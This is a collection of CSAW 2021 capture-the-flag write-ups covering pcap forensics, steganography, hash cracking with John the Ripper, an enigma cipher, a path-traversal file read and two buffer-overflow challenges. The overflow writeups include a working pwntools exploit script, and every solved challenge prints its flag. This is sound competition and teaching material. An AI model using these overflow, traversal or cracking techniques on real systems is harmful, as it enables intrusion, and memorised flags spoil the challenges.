<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-cr15pr
description: CTF writeups and security challenges by CR15PR.
---

# Writeups by CR15PR

Source repository: `/repos/CR15PR`

## Repository Index

- CSAW2021/README.md
- CSAW2021/web/Gatekeeping/README.md
- CSAW2021/web/ninja/README.md
- CSAW2021/warm-up/Crack_me/README.md
- CSAW2021/warm-up/Password_Checker/README.md
- CSAW2021/warm-up/Turing/README.md
- CSAW2021/warm-up/checker/README.md
- CSAW2021/warm-up/poem-collection/README.md
- CSAW2021/rev/RanadomwaRE/README.md
- CSAW2021/rev/hardskull/README.md
- CSAW2021/rev/macomal/README.md
- CSAW2021/pwn/Alien_math/README.md
- CSAW2021/pwn/haySTACK/README.md
- CSAW2021/misc/Save_the_tristate/README.md
- CSAW2021/misc/Weak_password/README.md
- CSAW2021/ics/A_Different_Type_of_Serial_Key/README.md
- CSAW2021/ics/A_Pain_in_the_BAC{net)/README.md
- CSAW2021/ics/Magic_modbus/README.md
- CSAW2021/forensics/Contact_Us/README.md
- CSAW2021/forensics/Lazy_Leaks/README.md
- CSAW2021/forensics/Sonicgraphy_fallout/README.md
- CSAW2021/forensics/mic/README.md
- CSAW2021/crypto/Forgery/README.md
- CSAW2021/crypto/RSA_Pop_Quiz/README.md

## Writeup Content


### File: CSAW2021/README.md

# CSAW 2021 Writeups       
![pic](Screenshot_1.png)
| Challenge | Category | Solved by|
| ----------- | ----------- | ----------- |
| [The Magic Modbus](https://github.com/CR15PR/CSAW2021/tree/main/ics/Magic_modbus) | ics | root2thrill |
| [Lazy Leaks](https://github.com/CR15PR/CSAW2021/tree/main/forensics/Lazy_Leaks) | Forensics | root2thrill |
| [Poem Collection](https://github.com/CR15PR/CSAW2021/tree/main/warm-up/poem-collection) | warm-up | root2thrill |
| [Turing](https://github.com/CR15PR/CSAW2021/tree/main/warm-up/Turing) | warm-up | root2thrill |
| [Password Checker](https://github.com/CR15PR/CSAW2021/tree/main/warm-up/Password_Checker) | warm-up | dancing.pickle |
| [checker](https://github.com/CR15PR/CSAW2021/tree/main/warm-up/checker) | warm-up | root2thrill |
| [Weak Password](https://github.com/CR15PR/CSAW2021/tree/main/misc/Weak_password) | misc | root2thrill |
| [Sonicgraphy Fallout](https://github.com/CR15PR/CSAW2021/tree/main/forensics/Sonicgraphy_fallout) | Forensics | root2thrill |
| [a pain in the BAC(net)](https://github.com/CR15PR/CSAW2021/blob/main/ics/A_Pain_in_the_BAC%7Bnet\)/README.md) | ics | root2thrill |
| [Alien Math](https://github.com/CR15PR/CSAW2021/tree/main/pwn/Alien_math) | pwn | dancing.pickle |
| [mic](https://github.com/CR15PR/CSAW2021/tree/main/forensics/mic) | forensics | dancing.pickle |
| [Contact Us](https://github.com/CR15PR/CSAW2021/tree/main/forensics/Contact_Us) | forensics | dancing.pickle |
| [Crack Me](https://github.com/CR15PR/CSAW2021/tree/main/warm-up/Crack_me) | warm-up | root2thrill |

![stats](stats.png)
Notes: <br>

Overall we placed 211th of 1216 teams with 1+ points.  We competed as a duo, [root2thrill](https://github.com/ivanchubb) and dancing.pickle. We were strong on forensics and stego, but weak on web, reversing, and pwn.  I felt like with more time we could have done better on a couple of the RSA problems.  Infrastructure was a bit unstable at times, but we still learned a lot and are grateful to participate in CSAW 2021. Looking forward to next year!




### File: CSAW2021/crypto/Forgery/README.md




### File: CSAW2021/crypto/RSA_Pop_Quiz/README.md




### File: CSAW2021/forensics/Contact_Us/README.md

## Wireshark
The objetive of this challenge is to find the message Veronica sent via an online contact us form to one of her clients. You are given a .pcap file and a TLS (Pre)-Master-Secret log that contains the TLS keys needed to decrypt some of the content.

Importing the keys can be done by going to wireshark preferences, protocols, then TLS. Upload the file; then enable the `Reassemble out-of-order segments` option under the TCP section.

Wireshark is now configured to decrypt TLS data. 

Our method of attack was to filter by all streams and exclude them manually. To reduce the starting size we filtered by `ip.src == 192.168.198.135` since this was the private IP that had the most outbound connections. We made the assumption this is Veronica's workstation. Our next assumption was this will be encrypted data so either HTTP2 or TLS data so we filtered for these first. Finally we assumed this would be accompished through a POST action or some sort of application transaction.

By manually inspection and excluding streams we eventually find the following JSON data in TCP Stream 46:
![pic](https://github.com/CR15PR/CSAW2021/blob/main/forensics/Contact_Us/2021-09-11_22-32_1.png)

Upon inspection we are greeted with Veronica's message to her client: `flag{m@r$hm3ll0w$}`

![pic](https://github.com/CR15PR/CSAW2021/blob/main/forensics/Contact_Us/2021-09-11_22-32.png)

## Tshark
Or a two liner in tshark:

```
tshark -r ContactUs.pcap -V -x -o tls.keylog_file:key.log > output
grep 'flag{' output
```



### File: CSAW2021/forensics/Lazy_Leaks/README.md

# Lazy Leaks

![](question.png)

1) provided a PCAP file i looked at unsecure communication. AKA non-encrypted. The first protocol that jumped out at me was TELNET

![](telnet.png)

2) right click > Follow > TCP Stream

3) We got the flag!
![](flag.png)
- `flag{T00_L@ZY_4_$3CUR1TY}`



### File: CSAW2021/forensics/Sonicgraphy_fallout/README.md

# Sonicgraphy Fallout

![](question.png)

1) We are given a zip file with 40 files, all pictures. all .jpg or .png. one of them has a hidden video.
![](files.png)

2) `unzip Fallout_-New_Mobius.zip`

3) use zsteg on all of them to look for hidden files `zsteg *`

![](zsteg.png)

4) We see an .mp4 file in Page 7 at offset 0x158d89 and size 4320060

5) remove it with dd
 - `dd bs=1 skip=1412489 count=4320060 if=Page\ 7.png of=video`
  - `bs=1` byte size 1 (1 byte at a time)
  - `skip=1412489` skip to the specified offset 0x158d89 (dd takes decimals)
  - `count=4320060` extract that many bytes
  - `if=Page\ 7.png` input file is "Page 7.png"
  - `of=video` output to a file named video

6) open it with a media player

![](sanic.gif)



### File: CSAW2021/forensics/mic/README.md

## deda_gui

The objective of this challenge is to find the hidden message in the blank pdf files. The first thing that should come to mind as these are scanned files and the author of the challenge tells us that they were printed, is MIC dots.
A great tool for MIC analysis is [deda](https://pypi.org/project/deda/).

`poppler-utils` is another great resource that can be used for pdf analysis and manipulation. 

`deda_gui` will open a web portal where you can upload files or directories under the forensics tab. 

The pdf must be converted into .png before deda can analyse it.

This can be done with an online converter for through the command line: `dftoppm scan.pdf scan -png`

The output is a pdf file named resultForensic.pdf that has data on the unique mics.

![pic](https://github.com/CR15PR/CSAW2021/blob/main/forensics/mic/mic.png)

The serial of each page (35) can be converted to ascii and we have our flag: `flag{watchoutforthepoisonedcoffee}`

## deda_cli

This is borrowed from https://ctftime.org/writeup/30175 and written by GoProSlowYo but included for others to see how quickly the command line can parce through the images

```pdftoppm scan.pdf scan -png; for x in {01..34}; do echo -n $(python3 -c "print(chr($(deda_parse_print scan-$x.png | grep serial | cut -d '-' -f2 | sed 's/^0*//')))"); done```



### File: CSAW2021/ics/A_Different_Type_of_Serial_Key/README.md




### File: CSAW2021/ics/A_Pain_in_the_BAC{net)/README.md

# A Pain in the BAC(net)

![](question.png)

1) given a .pcap file, look through the sensors and find the one with some anamalous data

2) open the .pcap in wireshark and look around.

3) the question specifies we are looking for an "analog sensor".
 - looking in wiresharks display filters we can filter for the values of these sensors with `bacapp.present_value.real`

4) Now we only see a small 160 packet capture of each of the 8 sensors. They vary in measurements from KG, Lumens, Liters, etc
 - looking at packets one by one, most values of a single sensor don't change by more than +-10%. however the one measuring lumens jumps from ~1400 lumens to 9999 at packet 2033

5) this sensor is named "Sensor_12345". `flag{Sensor_12345}`

![](anamoly.png)



### File: CSAW2021/ics/Magic_modbus/README.md

# The Magic Modbus

![](question.png)

1) view the pcap file in wireshark
- ![](pcap.png)

2) right click a packet > Follow > TCP Steam
- ![](message.png)
- interesting, it's a message.  Changing the TCP Stream to stream 2 reveals the flag

3) ![](flag.png)
- `flag{Ms_Fr1ZZL3_W0ULD_b3_s0_Pr0UD}`



### File: CSAW2021/misc/Save_the_tristate/README.md




### File: CSAW2021/misc/Weak_password/README.md

# Weak_password

![](question.png)

1) ok, so from the question its clear we need to crack his hash and we are given a hint that the password contains his name and a date in they `YYYYMMDD` format. Quickly the steps to do this are:
 - identify the hash type
 - make a wordlist for all possible combinations of his name and date in the specified format
 - input it into John The Ripper and crack the hash

### Checking the hash type

1) go to [an online hash analyzer](https://www.tunnelsup.com/hash-analyzer/) and input the hash

![](hash.png)

- looks like it's MD5

### Making the wordlist

1) the wordlist must contains the dates in the `YYYYMMDD` format.  I started from 1970 and went through 2021 for my range and generated it with my python script [dategen.py](dategen.py).

2) additionally i added an array of mangled versions of "aaron"
 - `echo "aaron" > aaron.txt`
 - `rsmangler --file aaron.txt --output mangled.txt`
 - `cat mangled.txt`

 ![](mangler.png)

 - i took most of the highlighted values and prepended/appended them to each date in my [dategen.py](dategen.py) script

3) run the script

```
year= 1970

mangler = ["aaron","aaronaaron","noraa","Aaron","AARON","44r0n","4@r0n","@4r0n","@@r0n"]

with open("dates.txt", "w") as dates:
    while year < 2022:
        month = 1
        while month < 13:
            day=1
            while day < 32:
                daystr = f"{day:02d}"
                monstr = f"{month:02d}"
                yearstr = str(year)
                for i in mangler:
                    dates.write(i+yearstr+monstr+daystr+"\n")
                    dates.write(yearstr+monstr+daystr+i+"\n")
                day+=1
            month +=1
        year +=1
```

### Crack the Hash

- `echo "7f4986da7d7b52fa81f98278e6ec9dcb" > hash.txt`
- `john --wordlist=dates.txt --format=RAW-MD5 hash.txt`

![](john.png)

- `flag{Aaron19800321}` i suppose the mangler wasn't necessary, but its still good practice



### File: CSAW2021/pwn/Alien_math/README.md

The goal of this challenge is to call the print_flag function which opens the flag.txt file on the remote server. In order to call the print_flag function you have to answer two questions correctly to get to the vulnerable `gets` function in `final_question`.
While the first and second questions do not have b0f vulnerable functions they have poor implementations of rand() that enable you to bypass the checks in order to get to the vulnerable function.

Main takes user input from `__isoc99_scanf` and string formats it to a decimal number. Then `rand()` is called with a default seed and compared against the user input. This is not a secure function and can is easily predicted. This funciton will always return the same result on the first iteration based on your version of libc if given a default seed. Since we have to bypass this check we have two options; to either have python generate the value or pull it from memory. I chose to pull the value from GDB.

`b *main+103` to stop at ` 0x00000000004015f5 <+103>:	cmp    QWORD PTR [rbp-0x8],rax`

`$rax` is compared to `$rbp-0x8` so we examine this offset on the stack: `x/gx $rbp-0x8` and we get `0x7fffffffdcf8:	0x000000006b8b4567` or 1804289383 in decimal.

           
     
```c
int main(void)

{
  int tmp_rand;
  char q2_buf [36];
  int q1_buf;
  long val_rand;
  
  puts("\n==== Flirbgarple Math Pop Quiz ====");
  puts("=== Make an A to receive a flag! ===\n");
  puts("What is the square root of zopnol?");
  fflush(stdout);
  __isoc99_scanf(" %d",&q1_buf);
  tmp_rand = rand();
  val_rand = (long)tmp_rand;
  if (val_rand == q1_buf) {
    puts("Correct!\n");
    fflush(stdout);
    getchar();
    puts("How many tewgrunbs are in a qorbnorbf?");
    fflush(stdout);
    __isoc99_scanf("%24s",q2_buf);
    second_question(q2_buf);
  }
  else {
    puts("Incorrect. That\'s an F for you!");
  }
  return 0;
}
```

After this `__isoc99_scanf` is called again and our input is formated to a max of 24 characters as a string. Our input is then put passed into the `second_question` function

Next some funky values are placed on the stack and our input is sent through a convulated transformation. 
```c
void second_question(char *user_input)

{
  int y;
  size_t len_var_to_match;
  ulong uVar1;
  undefined8 var_to_match;
  undefined8 unused1;
  undefined8 unused2;
  int index;
  char x;
  
  index = 0;
  while( true ) {
    uVar1 = SEXT48(index);
    len_var_to_match = strlen(user_input);
    if (len_var_to_match - 1 <= uVar1) {
      var_to_match = 3762247539570849591;
      unused1 = 0x3332333535323538;
      unused2 = 0x353232393232;
      len_var_to_match = strlen((char *)&var_to_match);
      y = strncmp((char *)&var_to_match,user_input,len_var_to_match);
      if (y == 0) {
        puts("Genius! One question left...\n");
        final_question();
        puts("Not quite. Double check your calculations.\nYou made a B. So close!\n");
      }
      else {
        puts("You get a C. No flag this time.\n");
      }
      return;
    }
    if ((user_input[index] < '0') || ('9' < user_input[index])) break;
    x = user_input[(long)index + 1];
    y = second_question_function((int)user_input[index],user_input[index] + index);
    y = x + -48 + y;
    user_input[(long)index + 1] = (char)y + (char)(y / 10) * -10 + '0';
    index = index + 1;
  }
  puts("Xolplsmorp! Invalid input!\n");
  puts("You get a C. No flag this time.\n");
  return;
}
```
The transformation is compared against a static value of 7759406485255323229225. We can pull this value from memory:

`b *second_question+358` then give some input and continue and `x/gx $rdi` which yields 7759406485255323229225.

Again we have two options; we can either model the function in python and use [Microsoft's z3 utilities to create the acceptable input](https://github.com/CR15PR/CSAW2021/blob/main/pwn/Alien_math/z3_Solver.py) or [brute force the key](https://github.com/CR15PR/CSAW2021/blob/main/pwn/Alien_math/brute_force.py) character by character since the same input will always produce the same output.

User input is stored in `$rsi` so using this breakpoint you can character by character observe the changes to yield the correct result:

      7 - 7
      78 - 77
      785 - 775 
      7856 - 7759
      78564 - 77594
      785644 - 775940
      7856445 - 7759406
      78564458 - 77594064
      785644589 - 775940648
      7856445899 - 7759406485
      78564458992 - 77594064852
      785644589921 - 775940648525
      7856445899213 - 7759406485255
      78564458992130 - 77594064852553
      785644589921306 - 775940648525532
      7856445899213065 - 7759406485255323
      78564458992130654 - 77594064852553232
      785644589921306542 - 775940648525532322
      7856445899213065428 - 7759406485255323229
      78564458992130654287 - 77594064852553232292
      785644589921306542879 - 775940648525532322922
      7856445899213065428791 - 7759406485255323229225

We can confirm our correct value again at `second_question+358`:

![pic](https://github.com/CR15PR/CSAW2021/blob/main/pwn/Alien_math/alien-math-rdi-rsi.png)

After this `final_question` is called and we find the vulnerable `gets` fucntion. This is a standard b0f that allows us to control `$rip` in order to call the `print_flag` function.

Using `! python3 -c "import pwn; print(pwn.cyclic(100, n=8))" > cyclic` we determine the offset to get a SIGSEV is 24. We use pwntools amazing abstraction ability to find the location of the print_flag symbol and pack it little endien compliant: `printFlag = p64(math_elf.symbols.print_flag)`.

We then send our [payload](https://github.com/CR15PR/CSAW2021/blob/main/pwn/Alien_math/solver.py) and get our flag.

```python
#!/usr/bin/env python3

from pwn import *

LOCAL = False
context.binary = binary = '/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math'
math_elf = ELF(binary)
context.log_level = 'debug'
printFlag = p64(math_elf.symbols.print_flag)
OFFSET = 24
junk = b"A" * OFFSET

if LOCAL == False:
    p = remote('pwn.chal.csaw.io', 5004, ssl=False)
else:
    p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math')

guess1 = b"1804289383"
p.sendlineafter("What is the square root of zopnol?", guess1)
leak = p.recvuntil("!\n")
log.info(f"{leak = }")

if b"Correct!\n" in leak:
    guess2 = b"7856445899213065428791" #------> What we want to make: 7759406485255323229225
    p.sendlineafter("How many tewgrunbs are in a qorbnorbf?", guess2)
    #leak = p.recvuntil("You get a C. No flag this time.\n") ------> Debugging purposes
    leak = p.recvuntil("Genius! One question left...\n")
    log.info(f"{leak = }")

    if b"\nGenius!" in leak:
        payload = [
            junk,
            printFlag,
        ]
        payload = b''.join(payload)
        #payload = b''.join([p64(r) for r in payload])
        p.sendline(payload)
        p.interactive()
    else:
        p.kill()
else:
    p.kill()
```

    Here is your flag: 
    flag{w3fL15n1Rx!_y0u_r34lLy4R3@_fL1rBg@rpL3_m4573R!}



### File: CSAW2021/pwn/haySTACK/README.md





### File: CSAW2021/rev/RanadomwaRE/README.md




### File: CSAW2021/rev/hardskull/README.md




### File: CSAW2021/rev/macomal/README.md




### File: CSAW2021/warm-up/Crack_me/README.md

# Crack Me

![](question.png)

1) pretty straightforward, just crack the hash provided using a known salt.

2) find the salt
 - input the hash into an [online hash analyzer](https://www.tunnelsup.com/hash-analyzer/)
 - ![](hashanalyzer1.png)
 - salt is `sha256`

### crack the hash with John the Ripper
1) `john --list=subformats | grep sha256`
  - ![](subformat.png)
  - we will be using `dynamic_61`

2)  `echo "username:a60458d2180258d47d7f7bef5236b33e86711ac926518ca4545ebf24cdc0b76c$sha256" > crack.txt`

3) `john --format=dynamic_61 --wordlist=/usr/share/wordlists/rockyou.txt crack.txt`

![](crack.png)


4) password is `cathouse`



### File: CSAW2021/warm-up/Password_Checker/README.md

# Password_Checker
The goal of this challenge is to get a shell on a remote system and cat the flag.txt file. This is done through a standard b0f through the vulnerable `gets` function that will allow us to control execution flow in order to call `back_door`.

`Main` is a fairly boring function that only calls `init` and `password_checker` then returns.

![pic](2021-09-12_13-31.png)

`Password_checker` executes a string comparison to a hard coded value then returns. However it uses `gets` and reads an arbitray amount of data.

![pic](2021-09-12_13-30.png) 

GDB-GEF disass of `password_checker`:

![pic](2021-09-12_13-33.png)

Ghidra shows the buffer size of local_48 as 60. While 61 bytes will overflow the buffer there is still some distance to `$rip`. Through testing it is found that the total offset to `$rip` is 72.

We can find the offset inside GDB with pwntools:

Set a breakpoint immediently following `gets`: `b *0x00000000004011f1`

Then generate your cyclic pattern: `! python3 -c "import pwn; print(pwn.cyclic(100, n=8))" > cyclic`

Execute the program with cyclic as the input `r < cyclic`

Examine the value of `$rbp`: `x/s $rbp`

Query the offset in 8 byte chunks: `! python3 -c "import pwn; print(pwn.cyclic_find('aaiaaaaa', n=8))"`

The beginning of `$rbp` is 62 + 8 bytes for the length of `$rbp` to equel 70

Through manual `demsg` inspection I found there was 2 extra bytes of padding to equal a total of 72 bytes as the offset

From here we control `$rip` and write out the next 8 bytes as the location of `back_door`: 0x0000000000401172

Our final [payload](https://github.com/CR15PR/CSAW2021/blob/main/warm-up/Password_Checker/solver.py) looks like this:
  ```back_door = p64(password_elf.symbols.backdoor)
  OFFSET = 72
  junk = b"A" * OFFSET
  back_door = p64(password_elf.symbols.backdoor)
  
  payload = [
    junk,
    back_door,
  ]

  payload = b''.join(payload)
  p.sendline(payload)```



### File: CSAW2021/warm-up/Turing/README.md

# Turing

![](question.png)

1) Turing implies the challenge is about [Alan Turing](https://en.wikipedia.org/wiki/Alan_Turing). He is most known for his work in cryptography that led to the Allies cracking the Enigma machine and the subsequent birth of modern computing.  

2) looking at the ciphertext one can assume it's a substitution cipher

3) reading the hint "M3 UKW B" and googling it shows they are enigma settings

4) go to [an online engima decoder](https://cryptii.com/pipes/enigma-machine) and input the ciphertext to get the flag
 - note: not sure if it was intentional or not that the default settings here were set the same as the flag encryption

 ![](flag.png)



### File: CSAW2021/warm-up/checker/README.md

# Checker

![](question.png)

files: [checker.py](checker.py)

1) reading the .py file

- ![](checker.png)

2) so the goal is to just do all the functions in reverse. Some of the functions you have to modify a bit (such as the bitshift in "up"). i left my scratch work in [checkertester](checkertester.py), but this one can all be done with a trial and error with prints even if your python skills aren't strong.

3) one by one i went through the functions backwards and annotated what they did and made a new python file that does the opposite [checkersolver.py](checkersolver.py)

4) ![](flag.png)



### File: CSAW2021/warm-up/poem-collection/README.md

# Poem Collection

![](question.png)

1) following the link takes us to a site with a link to directory `/poems`

2) ![](poems.png)

3) clicking a poem changes the URL to the file we chose.
 - ![](url.png)
 - what happens if we change it the poem argument to `flag.txt`?

4) `web.chal.csaw.io:5003/poems/?poem=flag.txt`
 - gives error of file not found

5) lets try the next directory up `../flag.txt`

![](flag.png)

- We got the Flag! `flag{l0c4l_f1l3_1nclusi0n_f0r_7h3_w1n}`



### File: CSAW2021/web/Gatekeeping/README.md




### File: CSAW2021/web/ninja/README.md


